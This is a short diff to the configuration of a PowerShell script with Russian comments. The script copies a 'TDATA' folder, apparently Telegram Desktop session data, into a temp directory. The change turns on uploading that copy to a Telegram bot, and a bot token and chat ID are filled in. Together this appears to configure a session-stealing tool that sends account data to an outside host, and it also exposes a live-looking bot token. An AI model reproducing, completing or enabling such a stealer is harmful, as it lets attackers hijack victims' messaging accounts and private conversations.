@@ -9,7 +9,7 @@ $script:Config = @{
     TempCopyDir   = "$env:TEMP\TDATA_Temp_$(Get-Random)"
 
     # --- ОТПРАВКА В TELEGRAM (заполните, чтобы включить) ---
-    EnableUpload  = $false   # $true - включить отправку, $false - только локально
+    EnableUpload  = $true   # $true - включить отправку, $false - только локально
     BotToken      = "8664245801:AAEAamU5KTWBGVYjeWBexKExYxX4Q0FmSx0"   # Ваш токен
     ChatId        = "243855738"                                        # Ваш Chat ID
 
